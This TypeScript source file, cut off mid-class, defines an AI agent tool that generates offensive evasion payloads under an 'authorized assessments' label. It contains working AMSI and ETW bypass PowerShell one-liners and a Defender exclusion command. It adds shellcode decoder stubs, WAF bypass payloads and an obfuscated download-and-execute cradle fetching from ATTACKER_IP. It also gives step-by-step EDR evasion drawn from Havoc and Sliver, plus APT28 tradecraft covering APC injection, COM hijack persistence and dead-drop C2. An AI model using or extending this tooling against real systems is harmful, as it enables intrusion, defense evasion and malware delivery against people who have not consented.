/**
 * TechniqueGeneratorTool — evasion-aware payload generation for authorized assessments
 *
 * Generates bypass-ready payload variants by combining:
 * 1. Havoc-derived operational patterns (order of operations, not just snippets)
 * 2. Evasion compiler strategies (how to construct payloads that avoid detection)
 * 3. Technique-specific generators (AMSI, ETW, WAF, shellcode, PowerShell)
 */

import type { Tool, ToolContext, ToolDefinition, ToolResult } from '../core/types.js'

// ── AMSI bypass templates ──────────────────────────────────────────────────

const AMSI_BYPASS_TEMPLATES: Record<string, string> = {
  reflection_patch: `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`,
  string_obfuscation: `$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiU'+[char]116+'ils')
$f=$a.GetField(('am'+[char]115+'iInitFailed'),'NonPublic,Static')
$f.SetValue($null,$true)`,
  env_var: `$env:COMPLUS_ETWEnabled=0
[Environment]::SetEnvironmentVariable('COMPLUS_ETWEnabled', 0, 'Process')`,
  ngen_assembly: `# Use .NET NGEN to bypass AMSI scanning
$n = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GetName().Name -eq 'System.Management.Automation' }`,
}

// ── ETW bypass templates ───────────────────────────────────────────────────

const ETW_BYPASS_TEMPLATES: Record<string, string> = {
  reflection_patch: `# ETW EventWrite patch via reflection
$etwAssembly = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
if ($etwAssembly) {
  $instance = $etwAssembly.GetField('etwProvider','NonPublic,Static').GetValue($null)
  $instance.GetType().GetField('m_enabled','NonPublic,Instance').SetValue($instance,$false)
}`,
  registry: `# Registry-based ETW disable (requires admin)
reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application" /v Start /t REG_DWORD /d 0 /f 2>$null`,
}

// ── WAF evasion ────────────────────────────────────────────────────────────

function wafEvasion(payload: string, wafType?: string): string {
  const lines: string[] = ['[TechniqueGenerator] WAF Evasion Payloads', '═'.repeat(50), '']

  if (wafType?.includes('宝塔') || wafType?.toLowerCase().includes('bt')) {
    lines.push('## Baota (BT Panel) WAF Bypass')
    lines.push(`Original payload: ${payload}`)
    lines.push('')
    lines.push('### Method 1: Unicode Encoding')
    lines.push(`  Encode keywords: admin → %u0061%u0064%u006d%u0069%u006e`)
    lines.push('')
    lines.push('### Method 2: SQL Comment Insertion')
    lines.push(`  Insert comments in keywords: OR/**/1=1 → SELECT/**/*/**/FROM`)
    lines.push('')
    lines.push('### Method 3: Chunked Transfer Encoding')
    lines.push(`  POST /target HTTP/1.1\n  Host: TARGET\n  Transfer-Encoding: chunked\n\n  5\n  ${payload.slice(0, 5)}\n  ${payload.length - 5}\n  ${payload.slice(5)}`)
    lines.push('')
    lines.push('### Method 4: HTTP Parameter Pollution')
    lines.push(`  Same parameter multiple times: ?id=1&id=2&id=${encodeURIComponent(payload)}`)
  } else if (wafType?.toLowerCase().includes('cloudflare')) {
    lines.push('## Cloudflare WAF Bypass')
    lines.push(`Original payload: ${payload}`)
    lines.push('')
    lines.push('### Method 1: Legitimate User-Agent + Referer')
    lines.push(`  curl -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" -H "Referer: https://www.google.com" "TARGET"`)
    lines.push('')
    lines.push('### Method 2: JSON Body Encoding')
    lines.push(`  POST /api HTTP/1.1\n  Content-Type: application/json\n  {"data": "${Buffer.from(payload).toString('base64')}"}`)
  } else {
    lines.push(`## Generic WAF Bypass (target: ${wafType || 'unknown'})`)
    lines.push(`Original payload: ${payload}`)
    lines.push('')
    lines.push('### Method 1: Case Transformation')
    lines.push(`  ${payload.replace(/[a-zA-Z]/g, (c) => c === c.toUpperCase() ? c.toLowerCase() : c.toUpperCase())}`)
    lines.push('')
    lines.push('### Method 2: Double URL Encoding')
    lines.push(`  ${encodeURIComponent(encodeURIComponent(payload))}`)
    lines.push('')
    lines.push('### Method 3: Chunked Transfer Encoding')
    const encoded = Buffer.from(payload).toString('hex').match(/.{1,16}/g)?.join('\n  ') ?? payload
    lines.push(`  Transfer-Encoding: chunked\n  ${encoded}`)
    lines.push('')
    lines.push('### Method 4: SQL Comment Insertion')
    lines.push(`  SELECT/**/*/**/FROM/**/users — replace SELECT * FROM users`)
    lines.push('')
    lines.push('### Method 5: HTTP Parameter Pollution')
    lines.push(`  ?id=1&id=2&id=${encodeURIComponent(payload)} — backend takes last value`)
  }

  return lines.join('\n')
}

// ── Shellcode encoding ─────────────────────────────────────────────────────

function shellcodeEncode(shellcodeHex: string, encoding: string): string {
  const lines: string[] = ['[TechniqueGenerator] Shellcode Encoding', '═'.repeat(50), '']

  if (encoding === 'xor' || encoding === 'hex' || encoding === 'base64') {
    const xorKey = '0xAB'

    if (encoding === 'xor') {
      lines.push(`## XOR Encoding (key: ${xorKey})`)
      lines.push(`Original shellcode (hex): ${shellcodeHex.slice(0, 80)}...`)
      lines.push('')
      lines.push('### PowerShell XOR Decoder Stub:')
      lines.push(`  $encoded = @()\n  $encoded = 0x00,0x01,0x02,0x03  # ← replace with actual XOR-encoded shellcode\n  $decoded = @()\n  for ($i = 0; $i -lt $encoded.Length; $i++) {\n    $decoded += ($encoded[$i] -bxor ${xorKey})\n  }\n  $ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($decoded.Length)\n  for ($i = 0; $i -lt $decoded.Length; $i++) {\n    [System.Runtime.InteropServices.Marshal]::WriteByte($ptr, $i, $decoded[$i])\n  }`)
    } else if (encoding === 'base64') {
      lines.push('## Base64 Segmented Encoding')
      lines.push(`Split shellcode into 3 segments, base64 each separately, concatenate at runtime`)
      lines.push('')
      lines.push('### PowerShell Decoder:')
      lines.push(`  $p1 = "BASE64_PART_1"\n  $p2 = "BASE64_PART_2"\n  $p3 = "BASE64_PART_3"\n  $full = [Convert]::FromBase64String($p1 + $p2 + $p3)\n  $ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($full.Length)\n  [System.Runtime.InteropServices.Marshal]::Copy($full, 0, $ptr, $full.Length)`)
    } else {
      lines.push(`## Hex Encoding`)
      lines.push(`Original: ${shellcodeHex.slice(0, 80)}...`)
      lines.push(`Encoded: ${shellcodeHex}`)
      lines.push('')
      lines.push('### PowerShell Hex Decoder:')
      lines.push(`  $hex = "${shellcodeHex}"\n  $bytes = [byte[]]::new($hex.Length / 2)\n  for ($i = 0; $i -lt $hex.Length; $i += 2) {\n    $bytes[$i/2] = [Convert]::ToByte($hex.Substring($i, 2), 16)\n  }`)
    }
  } else {
    lines.push(`## ${encoding} Encoding — Not Supported`)
    lines.push('Supported encodings: xor, base64, hex')
  }

  return lines.join('\n')
}

// ── Obfuscated PowerShell ──────────────────────────────────────────────────

function obfuscatedPS(script: string): string {
  const lines: string[] = ['[TechniqueGenerator] Obfuscated PowerShell', '═'.repeat(50), '']
  const base64 = Buffer.from(script, 'utf16le').toString('base64')
  lines.push('## Method 1: Base64 Encoding + IEX')
  lines.push(`  powershell -nop -w hidden -enc ${base64}`)
  lines.push('')
  lines.push('## Method 2: String Splitting + Variable Obfuscation')
  lines.push(`  $a = "IEX"\n  $b = "(New-Object Net.WebClient).Downlo"\n  $c = "adString('http://ATTACKER_IP/payload.ps1')"\n  & $a ($b + $c)`)
  lines.push('')
  lines.push('## Method 3: Char Array Reconstruction')
  lines.push(`  $cmd = -join ([char]73 + [char]69 + [char]88 + [char]32 + [char]39 + "payload")\n  iex $cmd`)
  return lines.join('\n')
}

// ── Havoc-derived strategies ───────────────────────────────────────────────

function havocOperationalPattern(): string {
  return `## Havoc Operational Pattern

Havoc's Demon agent follows this EXACT order for each operation:

1. **Connect to C2** → AES-256-CTR encrypted channel
2. **Enumerate environment** → OS, architecture, privileges, username, domain
3. **Check AMSI status** → if active, bypass BEFORE any PowerShell
4. **Check ETW status** → if active, bypass BEFORE executing commands
5. **Enumerate credentials** → only after AMSI/ETW bypassed
6. **Execute payload** → in-memory, no disk writes if possible
7. **Clean up** → remove artifacts, restore state if needed

### Why this order matters:
- If you execute PowerShell BEFORE AMSI bypass → AMSI logs everything
- If you enumerate creds BEFORE ETW bypass → Event Tracing records it
- If you write to disk BEFORE in-memory check → EDR scans the file
- The HAVOC order is: bypass first, then act

### How to apply:
- Always run EnvAnalyzer FIRST
- Based on results, execute bypasses in order: AMSI → ETW → payload
- Never skip bypass steps even if you think they're unnecessary`
}

function havocEvasionCompilerFlags(): string {
  return `## Havoc Evasion Compiler Strategy

Havoc cross-compiles payload C source at runtime using MinGW with these flags:

\`\`\`
x86_64-w64-mingw32-gcc \\
  -Os \\                           # Optimize for size
  -fno-asynchronous-unwind-tables \\  # Remove .eh_frame
  -fno-ident \\                   # Remove compiler identification
  -falign-functions=1 \\          # No function alignment
  -fpack-struct=8 \\              # Pack structs to 8-byte alignment
  --no-seh \\                     # Disable SEH
  --gc-sections \\                # Remove dead code sections
  -s \\                           # Strip all symbols
  -nostdlib \\                    # No standard library linking
\`\`\`

### Why these flags matter:
1. **-Os + -s + --gc-sections**: Binary size < 10KB. EDR heuristics often skip tiny files.
2. **-fno-asynchronous-unwind-tables**: Removes stack unwind info. EDR can't walk your stack.
3. **-fno-ident**: No "GCC" string in binary — avoids compiler fingerprinting.
4. **-nostdlib**: Zero imports from msvcrt.dll. No printf/malloc/strlen in IAT.`
}

function indirectSyscallStrategy(): string {
  return `## Havoc Indirect Syscall Strategy

### The Problem:
EDRs hook ntdll.dll functions (NtWriteVirtualMemory, NtCreateThreadEx, etc.)
by overwriting the first few bytes with a JMP to their monitoring code.

### Havoc's Solution:
1. Parse ntdll.dll in memory to find the SYSCALL instruction bytes
2. Extract the SSN (System Service Number) from eax register setup
3. Build a stub that jumps directly to the syscall instruction (skipping hooks)
4. Execute syscall directly from user space → kernel, bypassing EDR hooks

### How to apply:
- For C payloads: implement indirect syscall using the same SSN extraction
- For PowerShell: use [Ref].Assembly to call unmanaged syscalls directly
- The key principle: EDR hooks user-mode, but syscalls go to kernel directly`
}

function hardwareBypassStrategy(): string {
  return `## Havoc Hardware Breakpoint Bypass Strategy

### The Problem:
Traditional AMSI bypass patches memory (sets amsiInitFailed = true).
EDRs hook NtProtectVirtualMemory to detect memory permission changes.

### Havoc's Solution: Hardware Breakpoints (Dr0-Dr3)
1. Set Dr0 = address of AmsiScanBuffer entry point
2. Register VEH handler via AddVectoredExceptionHandler()
3. When AmsiScanBuffer is called, DR0 triggers → VEH fires
4. VEH handler modifies RSP to skip the scan → returns "clean"
5. No memory bytes changed — EDR sees nothing

### Why this works:
- Hardware breakpoints are CPU registers, not memory
- VEH is a legitimate Windows API
- No VirtualProtect calls needed`
}

function sleepObfuscationStrategy(): string {
  return `## Havoc Sleep Obfuscation Strategy (Ekko/Zilean/Foliage)

### The Problem:
EDR hooks NtDelayExecution (Sleep API). When malware sleeps, EDR can dump memory.

### Havoc's Solution: ROP-based Sleep with Image Encryption
1. Encrypt the entire payload image in memory with RC4
2. Set up a ROP chain that will decrypt after sleep completes
3. Call NtDelayExecution via the ROP chain
4. During sleep: memory is encrypted — EDR dump finds nothing

### Variants:
- **Ekko**: Uses NtWaitForSingleObject + ROP chain
- **Zilean**: Uses NtCreateTimer + NtSetTimer + NtWaitForSingleObject
- **Foliage**: Uses callback-based approach with RtlCreateTimer`
}

function stackSpoofingStrategy(): string {
  return `## Havoc Stack Spoofing Strategy

### The Problem:
When EDR inspects a thread's stack, it sees return addresses pointing to your payload.

### Havoc's Solution: Return Address Spoofing
1. Find a gadget in a legitimate DLL (kernel32, ntdll) — a "call" instruction
2. Use that gadget's address as the return address on the stack
3. When the syscall completes, it returns to the gadget (legitimate DLL)
4. EDR stack walk shows: your_code → kernel32 → ntdll → kernel (looks legitimate)`
}

function hashApiResolution(): string {
  return `## Havoc Hash-Based API Resolution

### The Problem:
Importing APIs by name puts strings in the binary. YARA scans for these strings.

### Havoc's Solution: DJB2 Hash + PEB Walking
1. Every API name is hashed with DJB2 at compile time
2. At runtime: parse PEB to find loaded modules
3. For each module, walk its export table
4. Hash each export name, compare with target hash
5. When hash matches → found the function address

### Why this works:
- Zero API name strings in binary
- No IAT entries
- Dynamic resolution at runtime`
}

// ── Sliver-derived strategies ──────────────────────────────────────────────

function refreshPE(): string {
  return `## Sliver RefreshPE — DLL Unhooking from Disk

### The Problem:
EDRs inject hooks into ntdll.dll and kernel32.dll at load time.

### Sliver's Solution: Reload DLL .text from Disk
1. Open the DLL file from disk (C:\\Windows\\System32\\ntdll.dll)
2. Parse the PE header to find the .text section's file offset and size
3. Read the .text section's raw bytes from disk (clean — no EDR hooks)
4. Get the in-memory base address of the loaded DLL
5. VirtualProtect to RWX, copy clean bytes over, restore permissions
6. All EDR hooks in ntdll/kernel32 are now gone

### When to Use:
- Use RefreshPE as the FIRST step on a Windows target with EDR
- After RefreshPE, all Win32/NT API calls go unmonitored
- Then apply AMSI/ETW bypasses`
}

function sgnEncoding(): string {
  return `## Sliver SGN Encoder — Shikata-Ga-Nai

### The Problem:
XOR encoding has a fixed key — if EDR knows the key, it can decode and scan.

### Sliver's Solution: SGN (Go port of Metasploit's classic encoder)
SGN uses an **Additive Feedback with Linear (ADFL) cipher**:
1. **Random seed generation**: Each encoding uses a different random seed
2. **ADFL cipher**: byte[i] encoded = (byte[i] + key) XOR prev_encoded_byte
3. **Decoder stub**: A small polymorphic decoder is prepended
4. **Bad character avoidance**: SGN retries encoding (up to 64 attempts)
5. **ASCII-printable mode**: Can produce entirely printable ASCII output

### Key Features:
- **Polymorphic**: Same shellcode → different output every time
- **Multi-iteration**: Can encode 1-64 times
- **Architecture support**: x86 and x64 decoder stubs`
}

function trafficEncoderPattern(): string {
  return `## Sliver Traffic Encoder Polymorphism

### The Problem:
C2 HTTP traffic with consistent patterns is detectable by network IDS/IPS.

### Sliver's Solution: Polymorphic HTTP Traffic
| Encoder | Output Format | Use Case |
|---------|--------------|----------|
| Base64 | Standard Base64 | General purpose |
| Base58 | Bitcoin-style | No special characters |
| Base32 | RFC 4648 | DNS-compatible |
| Hex | Hexadecimal | Raw binary transport |
| English | English words | Looks like natural text |
| PNG | PNG image | Steganographic transport |

### URL Randomization:
- Random paths built from configured segments
- Nonce query parameter: random characters inserted into numeric values
- OTP query arguments: one-time-pad-like random parameters`
}

function peDonorSpoofing(): string {
  return `## Sliver PE Donor Metadata Spoofing

### The Problem:
Compiled binaries have unique metadata. EDR/AV engines fingerprint these.

### Sliver's Solution: Clone Metadata from Legitimate Binaries
1. **Rich Header Cloning**: Replace with one from a legitimate binary
2. **Timestamp Cloning**: All PE timestamps set to match the donor
3. **Digital Signature Table Copying**: Copies signature table from legitimate binary
4. **Resource Section Injection**: Copies icons, manifests, version info
5. **PE Checksum Recalculation**: Recalculates checksum to match`
}

function dualModeDotNet(): string {
  return `## Sliver Dual-Mode .NET Execution

### Mode 1: In-Process CLR Hosting (--in-process)
- Loads CLR into the current process via go-clr library
- Assembly loaded from memory (byte array), not from disk
- AMSI/ETW bypasses applied BEFORE CLR loads

### Mode 2: Fork-and-Run (default)
- Spawns sacrificial process (notepad.exe by default)
- Converts .NET assembly to shellcode using Donut
- Injects shellcode into the sacrificial process
- PPID spoofing supported

### When to Use Each Mode:
| In-Process | Fork-and-Run |
|-----------|-------------|
| Stealthier (no new process) | Safer (if it crashes, implant survives) |
| AMSI/ETW bypass required | Donut conversion adds overhead |
| Best for: post-bypass, trusted target | Best for: one-shot tasks, untrusted target |`
}

function goTemplateCompilation(): string {
  return `## Sliver Go Template Conditional Compilation

### The Principle:
Sliver uses Go's text/template system to render implant source code at build time.
- **Dead code elimination**: Only selected C2 channels are compiled in
- **No unused imports**: Template conditionals control import statements
- **Minimal binary**: Only the features you need are in the binary
- **Each build is unique**: Different configs produce different binaries

### How to apply for assessments:
- When building custom tools, use conditional compilation to minimize binary
- Use garble for symbol obfuscation: -seed=random -literals -tiny`
}

function sliverOperationalPattern(): string {
  return `## Sliver Operational Patterns

### Sliver's Execution Order:
1. **Check Execution Limits** → Hostname, username, datetime, locale
2. **Connect to C2** → Age key exchange → ChaCha20-Poly1305 session
3. **Register with Server** → Sends hostname, username, OS, arch, PID
4. **Receive Tasks** → Tasks dispatched to handlers
5. **Execute Task** → AMSI/ETW bypass: 0xC3 RET patch
6. **Return Results**

### Key Differences from Havoc:
| Havoc | Sliver |
|-------|--------|
| Indirect syscalls | RefreshPE (disk-based unhook) |
| Hardware breakpoint AMSI bypass | 0xC3 memory patch AMSI bypass |
| Single execution mode | Dual mode (in-process + fork-and-run) |
| C2 handled by framework | Multi-transport abstraction |

### How to apply:
- For Windows EDR: RefreshPE → AMSI patch → ETW patch → payload
- For network stealth: use polymorphic HTTP encoding`
}

// ── APT28 strategies ───────────────────────────────────────────────────────

function apt28StringObfuscation(): string {
  return `## APT28 交替字节XOR + Null填充 字符串混淆

### 编码格式: 真实字符和垃圾字节交替排列:
原始字符串: "cmd.exe"
编码后（内存中）: [c][0x00][m][0x00][d][0x00][.][0x00][e][0x00][x][0x00][e][0x00][0x00][0x00]

**运行时解密算法**:
\`\`\`c
for (size_t i = 0; i < length; i += 2) {
    uint8_t realByte = encrypted[i];
    result[outIdx++] = (wchar_t)(realByte ^ xorKey);
}
\`\`\`

**APT28使用的XOR密钥**: 0x43 (单字节), 多字节密钥 (API名和路径)`
}

function apt28RotatingXOR(): string {
  return `## APT28 76字节轮转XOR密钥 — 核心载荷解密

**解密算法**:
\`\`\`c
for (size_t i = 0; i < dataLen; i++) {
    out[i] = encryptedData[i] ^ key[i % keyLen];  // 轮转索引: i % 76
}
\`\`\`

**密钥空间**: 2^(76*8) = 2^608 — 暴力破解不可能
**多层加密链**: XOR(单字节) → XOR(轮转76字节) → PNG隐写 → 最终XOR/RC4`
}

function apt28PNGSteganography(): string {
  return `## APT28 PNG隐写术 — 从图片像素提取Shellcode

### 完整的APT28解密链:
1. 从DLL资源段读取加密的PNG文件
2. 76字节轮转XOR解密PNG文件数据
3. 解析PNG格式 → 10个专用函数处理IHDR/PLTE/IDAT/IEND
4. 从IDAT chunk提取压缩像素数据 → zlib解压
5. LSB提取: 从像素最低位还原隐藏的二进制流
6. 最后一道解密 (XOR或RC4) → 得到真正的shellcode
7. VirtualAlloc(RW) → 写入shellcode → VirtualProtect(RX) → 执行`
}

function apt28MemoryPermissionTransition(): string {
  return `## APT28 内存权限转换 — RW→RX避免EDR检测

**APT28的做法**:
\`\`\`c
VirtualAllocEx(hProcess, 0, size, MEM_COMMIT, PAGE_READWRITE);  // RW
WriteProcessMemory(hProcess, mem, shellcode, size, NULL);         // 写入
VirtualProtectEx(hProcess, mem, size, PAGE_EXECUTE_READ, &old);   // → RX
CreateRemoteThread(hProcess, 0, 0, mem, NULL, 0, NULL);           // 执行
\`\`\`

| 权限 | EDR告警 |
|------|---------|
| PAGE_EXECUTE_READWRITE (RWX) | **高** — 最常见恶意模式 |
| PAGE_READWRITE → PAGE_EXECUTE_READ (RW→RX) | **低** — 合法软件也这样做 |`
}

function apt28APCInjection(): string {
  return `## APT28 APC注入 — QueueUserAPC比CreateRemoteThread更隐蔽

**APC注入流程**:
1. 枚举进程，找到目标（如explorer.exe）
2. 在目标进程中分配内存 (RW权限)
3. 写入shellcode
4. 修改权限为RX
5. 使用QueueUserAPC而非CreateRemoteThread

### APC注入为什么更隐蔽:
1. **不创建新线程**: 只是往现有线程的APC队列添加回调
2. **EDR监控较少**: CreateRemoteThread是EDR重点监控的API
3. **执行时机隐蔽**: APC在目标线程进入"可告警等待状态"时执行`
}

function apt28COMHijacking(): string {
  return `## APT28 COM劫持持久化 — InprocServer32注册表修改

**APT28使用的具体注册表路径**:
HKCU\\Software\\Classes\\CLSID\\{D9144DCD-E998-4ECA-AB6A-DCD83CCBA16D}\\InprocServer32

**修改前**: C:\\Windows\\System32\\legit.dll
**修改后**: C:\\Users\\Public\\伪装名.dll

### 为什么COM劫持有效:
1. **隐蔽**: 不修改Run键等常见自启动位置
2. **合法触发**: 系统操作正常触发COM组件加载
3. **权限要求低**: HKCU（当前用户）权限即可修改`
}

function apt28DeadDropResolver(): string {
  return `## APT28 Dead Drop Resolver — 合法云API作为C2通信信道

APT28的CovenantGrunt后门使用 **filen.io**（合法云盘服务）的官方API进行交互。

### Dead Drop工作原理:
1. 植入物定期发起HTTPS请求到filen.io的API
2. 攻击者在filen.io的特定共享目录中放置指令
3. 植入物下载并解析文件，提取隐藏的指令
4. 执行指令后将结果上传到另一个隐藏位置

### 为什么Dead Drop有效:
1. **合法域名**: filen.io是合法云服务，不会被防火墙/IDS封禁
2. **HTTPS加密**: 所有通信通过HTTPS
3. **流量正常**: 看起来像正常的云盘API调用`
}

function apt28WebDAVUNC(): string {
  return `## APT28 WebDAV UNC路径 — DLL无落地内存加载执行

**APT28的LNK构造**:
C:\\Windows\\System32\\rundll32.exe \\\\104.168.x.x\\webdav\\SimpleLoader.dll,EntryPoint

关键点:
1. 使用UNC路径 (\\\\server\\share\\file.dll)
2. 通过Windows WebClient服务访问远程WebDAV共享
3. DLL直接从网络加载到内存，不写到本地磁盘
4. rundll32.exe是系统合法程序（LOLBin）`
}

function apt28OperationalPattern(): string {
  return `## APT28 操作模式 — Operation Neusploit 完整感染链

### 完整感染链:
1. **文档触发**: RTF → CVE → COM对象 → UNC路径
2. **WebDAV拉取**: UNC → payload.lnk + SimpleLoader.dll (无落地)
3. **SimpleLoader执行**: CreateMutexW → 交替字节XOR → VirtualAlloc(RW) → 76字节轮转XOR → PNG解码 → LSB提取shellcode
4. **进程注入**: explorer.exe → VirtualAllocEx(RW) → WriteProcessMemory → VirtualProtectEx(RX) → QueueUserAPC
5. **C2通信**: CovenantGrunt .NET → HTTPS → filen.io API (Dead Drop)
6. **持久化**: COM劫持: HKCU\\...\\CLSID\\{...}\\InprocServer32

### APT28免杀对抗核心思路:
1. **多层加密**: XOR(单字节) → XOR(轮转76字节) → PNG隐写 → 最终XOR/RC4
2. **无文件落地**: UNC路径直接内存加载
3. **合法工具**: rundll32.exe、WebClient服务、COM组件
4. **权限最小化**: RW→RX，避免RWX
5. **隐蔽执行**: APC注入 > CreateRemoteThread
6. **合法C2**: 云API替代直接C2服务器
7. **隐蔽持久化**: COM劫持替代Run键`
}

// ── Tool implementation ────────────────────────────────────────────────────

interface TechniqueGeneratorInput {
  technique: 'amsi_bypass' | 'etw_bypass' | 'shellcode_encode' | 'waf_evasion' | 'obfuscated_ps' | 'havoc_strategy' | 'sliver_strategy' | 'refresh_pe' | 'sgn_encoding' | 'traffic_encoder' | 'pe_donor' | 'dotnet_dual' | 'go_template' | 'apt28_strategy' | 'apt28_string_obf' | 'apt28_rotating_xor' | 'apt28_png_stego' | 'apt28_memory_transition' | 'apt28_apc_inject' | 'apt28_com_hijack' | 'apt28_dead_drop' | 'apt28_webdav_unc' | 'custom'
  payload: string
  platform?: 'windows' | 'linux'
  analysis_context?: { waf?: string; edr?: string; sandbox?: boolean }
  encoding?: 'base64' | 'hex' | 'xor'
}

export class TechniqueGeneratorTool implements Tool {
  name = 'TechniqueGenerator'

  definition: ToolDefinition = {
    type: 'function',
    function: {
      name: 'TechniqueGenerator',
      description: `Generate evasion-aware payload variants for authorized security assessments.

## Techniques
- amsi_bypass: PowerShell AMSI bypass (reflection patch / string obfuscation / env vars)
- etw_bypass: ETW logging bypass (reflection patch / registry)
- shellcode_encode: Shellcode encoding (XOR/Base64/Hex + decoder stub)
- waf_evasion: WAF bypass (chunked encoding / parameter pollution / Unicode)
- obfuscated_ps: PowerShell obfuscation (base64/IEX/string splitting)
- havoc_strategy: Return Havoc-derived evasion strategy principles
- sliver_strategy: Return Sliver-derived evasion strategy principles
- refresh_pe: DLL unhooking by reloading .text section from disk
- sgn_encoding: Shikata-Ga-Nai polymorphic shellcode encoding
- traffic_encoder: HTTP traffic encoder polymorphism
- pe_donor: PE metadata spoofing from legitimate binaries
- dotnet_dual: Dual-mode .NET execution guidance
- go_template: Go template conditional compilation principles
- apt28_strategy: Return APT28 (Operation Neusploit) derived evasion strategy principles
- apt28_string_obf: Alternating byte XOR + null padding string obfuscation
- apt28_rotating_xor: 76-byte rotating XOR key payload decryption
- apt28_png_stego: PNG steganography shellcode extraction (IDAT LSB)
- apt28_memory_transition: RW→RX page transition avoiding RWX detection
- apt28_apc_inject: APC injection via QueueUserAPC
- apt28_com_hijack: COM hijacking persistence via InprocServer32
- apt28_dead_drop: Dead Drop Resolver — cloud API as C2 channel
- apt28_webdav_unc: WebDAV UNC path DLL loading without disk landing
- custom: Custom bypass technique`,
      parameters: {
        type: 'object',
        properties: {
          technique: {
            type: 'string',
            enum: ['amsi_bypass', 'etw_bypass', 'shellcode_encode', 'waf_evasion', 'obfuscated_ps', 'havoc_strategy', 'sliver_strategy', 'refresh_pe', 'sgn_encoding', 'traffic_encoder', 'pe_donor', 'dotnet_dual', 'go_template', 'apt28_strategy', 'apt28_string_obf', 'apt28_rotating_xor', 'apt28_png_stego', 'apt28_memory_transition', 'apt28_apc_inject', 'apt28_com_hijack', 'apt28_dead_drop', 'apt28_webdav_unc', 'custom'],
            description: 'Evasion technique type',
          },
          payload: { type: 'string', description: 'Original payload/command/shellcode' },
          platform: { type: 'string', enum: ['windows', 'linux'], description: 'Target platform' },
          analysis_context: {
            type: 'object',
            properties: {
              waf: { type: 'string', description: 'Detected WAF type' },
              edr: { type: 'string', description: 'Detected EDR type' },
              sandbox: { type: 'boolean', description: 'Whether in sandbox environment' },
            },
            description: 'EnvAnalyzer detection results',
          },
          encoding: { type: 'string', enum: ['base64', 'hex', 'xor'], description: 'Encoding method (valid for shellcode_encode)' },
        },
        required: ['technique', 'payload'],
      },
    },
  }

  async execute(input: Record<string, unknown>, _context: ToolContext): Promise<ToolResult> {
    const { technique, payload, platform = 'windows', analysis_context, encoding = 'xor' } = input as unknown as TechniqueGeneratorInput

    let output = ''

    switch (technique) {
      case 'amsi_bypass':
        output = this.generateAMSI(payload, analysis_context?.edr)
        break
      case 'etw_bypass':
        output = this.generateETW(payload, analysis_context?.edr)
        break
      case 'shellcode_encode':
        output = shellcodeEncode(payload, encoding)
        break
      case 'waf_evasion':
        output = wafEvasion(payload, analysis_context?.waf)
        break
      case 'obfuscated_ps':
        output = obfuscatedPS(payload)
        break
      case 'havoc_strategy':
        output = [
          havocOperationalPattern(), '',
          havocEvasionCompilerFlags(), '',
          indirectSyscallStrategy(), '',
          hardwareBypassStrategy(), '',
          sleepObfuscationStrategy(), '',
          stackSpoofingStrategy(), '',
          hashApiResolution(),
        ].join('\n')
        break
      case 'sliver_strategy':
        output = [
          sliverOperationalPattern(), '',
          refreshPE(), '',
          sgnEncoding(), '',
          trafficEncoderPattern(), '',
          peDonorSpoofing(), '',
          dualModeDotNet(), '',
          goTemplateCompilation(),
        ].join('\n')
        break
      case 'refresh_pe': output = refreshPE(); break
      case 'sgn_encoding': output = sgnEncoding(); break
      case 'traffic_encoder': output = trafficEncoderPattern(); break
      case 'pe_donor': output = peDonorSpoofing(); break
      case 'dotnet_dual': output = dualModeDotNet(); break
      case 'go_template': output = goTemplateCompilation(); break
      case 'apt28_strategy':
        output = [
          apt28OperationalPattern(), '',
          apt28StringObfuscation(), '',
          apt28RotatingXOR(), '',
          apt28PNGSteganography(), '',
          apt28MemoryPermissionTransition(), '',
          apt28APCInjection(), '',
          apt28COMHijacking(), '',
          apt28DeadDropResolver(), '',
          apt28WebDAVUNC(),
        ].join('\n')
        break
      case 'apt28_string_obf': output = apt28StringObfuscation(); break
      case 'apt28_rotating_xor': output = apt28RotatingXOR(); break
      case 'apt28_png_stego': output = apt28PNGSteganography(); break
      case 'apt28_memory_transition': output = apt28MemoryPermissionTransition(); break
      case 'apt28_apc_inject': output = apt28APCInjection(); break
      case 'apt28_com_hijack': output = apt28COMHijacking(); break
      case 'apt28_dead_drop': output = apt28DeadDropResolver(); break
      case 'apt28_webdav_unc': output = apt28WebDAVUNC(); break
      case 'custom':
        output = `[TechniqueGenerator] Custom Bypass Technique\n\nOriginal payload: ${payload}\nPlatform: ${platform}\n\nPlease specify a concrete bypass technique.`
        break
      default:
        return { content: `Unknown technique: ${technique}`, isError: true }
    }

    return { content: output, isError: false }
  }

  private generateAMSI(payload: string, edrType?: string): string {
    const lines: string[] = ['[TechniqueGenerator] AMSI Bypass Payloads', '═'.repeat(50), '']
    lines.push('### Havoc Principle')
    lines.push('Havoc uses hardware breakpoints (Dr0-Dr3 + VEH) instead of memory patching.')
    lines.push('For PowerShell, use reflection-based bypass as the most practical alternative.')
    lines.push('')

    if (edrType?.includes('CrowdStrike')) {
      lines.push('## CrowdStrike Falcon Environment')
      lines.push('# Method 1: Reflection patch')
      lines.push(AMSI_BYPASS_TEMPLATES.string_obfuscation)
      lines.push('')
      lines.push('# Method 2: Then execute original payload')
      lines.push(AMSI_BYPASS_TEMPLATES.reflection_patch)
      lines.push(payload)
    } else if (edrType?.includes('Defender')) {
      lines.push('## Windows Defender Environment')
      lines.push('# Method 1: Add exclusion path (requires admin)')
      lines.push('  Add-MpPreference -ExclusionPath "C:\\temp"')
      lines.push('')
      lines.push('# Method 2: Reflection patch (no admin needed)')
      lines.push(AMSI_BYPASS_TEMPLATES.reflection_patch)
      lines.push('')
      lines.push('# Method 3: String obfuscation')
      lines.push(AMSI_BYPASS_TEMPLATES.string_obfuscation)
      lines.push('')
      lines.push('# Then execute original payload:')
      lines.push(payload)
    } else {
      lines.push(`## Generic AMSI Bypass (${edrType || 'unknown EDR'})`)
      lines.push('')
      let idx = 1
      for (const [name, template] of Object.entries(AMSI_BYPASS_TEMPLATES)) {
        lines.push(`### Method ${idx}: ${name}`)
        lines.push(template)
        lines.push('')
        idx++
      }
      lines.push(`Original payload: ${payload}`)
    }

    return lines.join('\n')
  }
